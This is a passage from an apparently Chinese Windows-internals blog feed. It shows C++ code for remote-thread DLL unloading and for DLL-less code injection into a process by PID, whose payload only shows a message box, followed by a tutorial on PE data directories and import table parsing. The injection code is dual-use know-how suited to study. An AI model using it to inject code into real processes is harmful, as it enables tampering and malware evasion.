class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">    <span class="comment">// 卸载dll</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, me32.hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="无DLL的代码注入"><a href="#无DLL的代码注入" class="headerlink" title="无DLL的代码注入"></a>无DLL的代码注入</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> STRLEN = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_Data</span> &#123;</span><br><span class="line">    FARPROC dwLoadLibrary;</span><br><span class="line">    FARPROC dwGetProcAddress;</span><br><span class="line">    FARPROC dwGetModuleHandle;</span><br><span class="line">    FARPROC dwGetModuleFileName;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> User32Dll[STRLEN];</span><br><span class="line">    <span class="type">char</span> MessageBox[STRLEN];</span><br><span class="line">    <span class="type">char</span> Str[STRLEN];</span><br><span class="line">&#125;DATA, *PDATA;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">RemoteThreadProc</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PDATA pData = (PDATA)lpParam;</span><br><span class="line">    <span class="comment">// 定义API函数原型</span></span><br><span class="line">    <span class="built_in">HMODULE</span>(__stdcall * MyLoadLibrary)(LPCTSTR);</span><br><span class="line">    <span class="built_in">FARPROC</span>(__stdcall * MyGetProcAddress)(HMODULE, LPCSTR);</span><br><span class="line">    <span class="built_in">HMODULE</span>(__stdcall * MyGetModuelHandle)(LPCTSTR);</span><br><span class="line">    <span class="built_in">int</span>(__stdcall * MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);</span><br><span class="line">    <span class="built_in">DWORD</span>(__stdcall * MyGetModuleFileName)(HMODULE, LPTSTR, DWORD);</span><br><span class="line">    <span class="comment">// 对各函数地址进行赋值</span></span><br><span class="line">    MyLoadLibrary = (<span class="built_in">HMODULE</span>(__stdcall*)(LPCTSTR))pData-&gt;dwLoadLibrary;</span><br><span class="line">    MyGetProcAddress = (<span class="built_in">FARPROC</span>(__stdcall*)(HMODULE, LPCSTR))pData-&gt;dwGetProcAddress;</span><br><span class="line">    MyGetModuelHandle = (<span class="built_in">HMODULE</span>(__stdcall*)(LPCTSTR))pData-&gt;dwGetModuleHandle;</span><br><span class="line">    MyGetModuleFileName = (<span class="built_in">DWORD</span>(__stdcall*)(HMODULE, LPTSTR, DWORD))pData-&gt;dwGetModuleFileName;</span><br><span class="line">    <span class="comment">// 加载user32.dll</span></span><br><span class="line">    HMODULE hModule = <span class="built_in">MyLoadLibrary</span>((LPCTSTR)pData-&gt;User32Dll);</span><br><span class="line">    MyMessageBox = (<span class="built_in">int</span>(__stdcall*)(HWND, LPCTSTR, LPCTSTR, UINT))<span class="built_in">MyGetProcAddress</span>(hModule, pData-&gt;MessageBox);</span><br><span class="line">    <span class="type">char</span> szModuleFileName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">MyGetModuleFileName</span>(hModule, (LPTSTR)szModuleFileName, MAX_PATH);</span><br><span class="line">    <span class="built_in">MyMessageBox</span>(<span class="literal">NULL</span>, (LPCTSTR)pData-&gt;Str, (LPCTSTR)szModuleFileName, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">noDllInjectCode</span><span class="params">(DWORD dwPid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开进程获取进程句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DATA Data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 获取kernel32.dll中相关的导出函数</span></span><br><span class="line">    Data.dwLoadLibrary = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    Data.dwGetProcAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">    Data.dwGetModuleHandle = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;GetModuleHandleA&quot;</span>);</span><br><span class="line">    Data.dwGetModuleFileName = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;GetModuleFileNameA&quot;</span>);</span><br><span class="line">    <span class="comment">// 需要其他DLL和导出函数</span></span><br><span class="line">    <span class="built_in">lstrcpy</span>((LPSTR)Data.User32Dll, <span class="built_in">TEXT</span>(<span class="string">&quot;user32.dll&quot;</span>));</span><br><span class="line">    <span class="built_in">lstrcpy</span>((LPSTR)Data.MessageBox, <span class="built_in">TEXT</span>(<span class="string">&quot;MessageBoxA&quot;</span>));</span><br><span class="line">    <span class="built_in">lstrcpy</span>((LPSTR)Data.Str, <span class="built_in">TEXT</span>(<span class="string">&quot;Dokey Inject Code&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在目标进程申请内存空间</span></span><br><span class="line">    LPVOID lpData = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(Data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpData == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx1 Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将数据写入目标内存中</span></span><br><span class="line">    SIZE_T dwWriteLen = <span class="number">0</span>;</span><br><span class="line">    BOOL bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, lpData, &amp;Data, <span class="built_in">sizeof</span>(Data), &amp;dwWriteLen);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在目标进程申请内存用于保存代码长度</span></span><br><span class="line">    DWORD dwFunction = <span class="number">0x4000</span>;</span><br><span class="line">    LPVOID lpCode = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwFunction, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpCode == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx2 Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, lpCode, &amp;RemoteThreadProc, dwFunction, &amp;dwWriteLen);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpCode, lpData, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">noDllInjectCode</span>(<span class="number">3076</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据目录表解析</title>
      <link href="/9180d97d.html"/>
      <url>/9180d97d.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>基础知识</strong></p><ul><li>基地址(ImageBase): 当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。</li><li>虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。</li><li>相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。</li><li>文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。</li></ul><p>它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA)</p></div><span id="more"></span><h2 id="数据目录表结构"><a href="#数据目录表结构" class="headerlink" title="数据目录表结构"></a>数据目录表结构</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DATA_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;     <span class="comment">// 虚拟地址，就是数据目录表的起始位置</span></span><br><span class="line">    DWORD   Size;               <span class="comment">// 尺寸，起始地址 + 尺寸 = 结束的位置</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><h3 id="Directory-Entries"><a href="#Directory-Entries" class="headerlink" title="Directory Entries"></a>Directory Entries</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// Export Directory       导出表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// Import Directory       导入表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// Resource Directory     资源表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory    异常</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory     安全</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// Base Relocation Table  重定位表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory        调试信息</span></span></span><br><span class="line"><span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data 版权信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// TLS Directory  TLS表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// Load Configuration Directory   </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// Import Address Table 导入函数地址表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br></pre></td></tr></table></figure><h2 id="地址函数转换"><a href="#地址函数转换" class="headerlink" title="地址函数转换"></a>地址函数转换</h2><div class="note info"><p><strong>与PE结构有关的三种地址</strong></p><p><code>VA(虚拟地址)</code>：PE文件映射到内存后的地址<br><code>RVA(相对虚拟地址)</code>：内存地址相对于映射基地址的偏移地址<br><code>FileOffset(文件偏移地址)</code>：相对PE文件在磁盘上的文件开头的偏移地址</p><ul><li>FOA &#x3D; RVA - H</li><li>FOA &#x3D; VA - ImageBase - H</li></ul></div><hr><ol><li><p>判断RVA是否在头部<br> FOA &#x3D; RVA</p></li><li><p>判断RVA位于哪个节<br> RVA &gt;&#x3D; Section[i]-&gt;VirtualAddress<br> RVA &lt;&#x3D; Section[i]-&gt;VirtualAddress + 当前节内存对齐后的大小</p><p> FOA &#x3D; RVA - Section[i]-&gt;VirtualAddress + Section[i]-&gt;PointerToRawData</p></li></ol><h3 id="转换函数代码"><a href="#转换函数代码" class="headerlink" title="转换函数代码"></a>转换函数代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">RVAToFOA</span><span class="params">(DWORD dwRVA, <span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// dwRVA 相对虚拟函数 buffer 已加载的文件内存映像</span></span><br><span class="line">    <span class="comment">// DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT 头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 区段</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNtHeader);</span><br><span class="line">    <span class="comment">// 判断是否落在头部</span></span><br><span class="line">    <span class="keyword">if</span>(dwRVA &lt; pSectionHeader[<span class="number">0</span>].VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwRVA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断落在哪个区段</span></span><br><span class="line">        <span class="keyword">if</span>(dwRVA &gt;= pSectionHeader[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> dwRVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwRVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-IMPORT-DESCRIPTOR-导入表"><a href="#IMAGE-IMPORT-DESCRIPTOR-导入表" class="headerlink" title="_IMAGE_IMPORT_DESCRIPTOR(导入表)"></a>_IMAGE_IMPORT_DESCRIPTOR(导入表)</h2><h3 id="IMAGE-IMPORT-DESCRIPTOR结构体"><a href="#IMAGE-IMPORT-DESCRIPTOR结构体" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR结构体"></a>IMAGE_IMPORT_DESCRIPTOR结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_IMPORT_DESCRIPTOR</strong></p><ul><li><code>OriginalFirstThunk</code>: 该字段指向导入名称表（INT）的RVA，该RVA指向的是一个<code>IMAGE_THUNK_DATA</code>的结构体</li><li><code>TimeDateStamp</code>: 该字段可以被忽略，一般为0即可</li><li><code>ForwarderChain</code>: 该字段一般为0</li><li><code>Name</code>: 该字段指向DLL名称的RVA地址</li><li><code>FirstThunk</code>: 该字段包含导入地址表（IAT）的RVA，IAT是一个<code>IMAGE_THUNK_DATA</code>的结构体数组</li></ul></div><h3 id="IMAGE-THUNK-DATA结构体"><a href="#IMAGE-THUNK-DATA结构体" class="headerlink" title="IMAGE_THUNK_DATA结构体"></a>IMAGE_THUNK_DATA结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_THUNK_DATA32</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_THUNK_DATA</strong></p><ul><li><code>ForwarderString</code>: 是转向它的第一个索引的函数的名称的RVA</li><li><code>Function</code>: 代表输入函数的地址</li><li><code>Ordinal</code>: 代表该函数在导入DLL中的序号。只有当<code>IMAGE_THUNK_DATA</code>的最高位为1时才代表使用序号导入，此时低31位代表在导入DLL中该函数的序号</li><li><code>AddressOfData</code>: 指向<code>IMAGE_IMPORT_BY_NAME</code>的一个指针，它表示用函数名进行导入。当<code>IMAGE_THUNK_DATA</code>的最高位为0时代表使用函数名进行导入，此时这四个字节代表着<code>IMAGE_IMPORY_BY_NAME</code>的RVA</li></ul><hr><ol><li>每一个<code>IMAGE_THUNK_DATA</code>对应一个DLL中的导入函数。<code>IMAGE_THUNK_DATA</code>与<code>IMAGE_IMPORT_DESCRIPORT</code>类似，同样是一个以全”0”的<code>IMAGE_THUNK_DATA</code>为结束</li><li>当<code>IMAGE_THUNK_DATA</code>值的最高位为1时，表示函数以序号方式导入，这时低31位被看作一个导入序号。当其最高位为0时；表示函数以函数名称字符串的方式导入，这时DWORD的值表示一个RVA，并指向一个<code>IMAGE_IMPORT_BY_NAME</code>结构体</li></ol></div><h3 id="IMAGE-IMPORT-BY-NAME结构体"><a href="#IMAGE-IMPORT-BY-NAME结构体" class="headerlink" title="IMAGE_IMPORT_BY_NAME结构体"></a>IMAGE_IMPORT_BY_NAME结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_BY_NAME</span> &#123;</span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_IMPORT_BY_NAME</strong></p><ul><li><code>Hint</code>: 该字段表示该函数在其导入表中的序号</li><li><code>Name</code>: 该字段表示导入函数的函数名。导入函数是一个以ASCII编码的字符串，并以NULL结尾。在<code>IMAGE_IMPORT_BY_NAME</code>中使用Name[1]来定义该字段，表示这是只有1个长度大小的字符串，但是函数名不可能只有一个字节的长度，通过越界访问来达到访问变长字符串的功能</li></ul></div><div class="note warning"><p><strong>注意</strong></p><ol><li><code>IMAGE_IMPORT_DESCRIPTOR</code>结构体中的<code>OriginalFirstThunk</code>和<code>FirstThunk</code>都指向了<code>IMAGE_THUNK_DATA</code>这个结构体，但是两者是有区别的。当文件在磁盘上时，两者指向的<code>IMAGE_THUNK_DATA</code>是相同的内容，而当文件被载入内存后，两者指向的就是不同的内容</li><li>在磁盘上时，<code>OriginalFirstThunk</code>指向的<code>IMAGE_THUNK_DATA</code>中保存的是指向函数名的RVA，称其为INT。<code>FirstThunk</code>通常指向的<code>IMAGE_THUNK_DATA</code>中保存的也是指向函数名的RVA，它们在磁盘上是没有差异的</li><li>当文件被载入内存后，<code>OriginalFirstThunk</code>指向的<code>IMAGE_THUNK_DATA</code>中保存的是指向函数名的RVA；<code>FirstThunk</code>通常指向的<code>IMAGE_THUNK_DATA</code>中由装载器填充的导入函数地址，称其为IAT。</li></ol></div><h3 id="解析导入表代码"><a href="#解析导入表代码" class="headerlink" title="解析导入表代码"></a>解析导入表代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 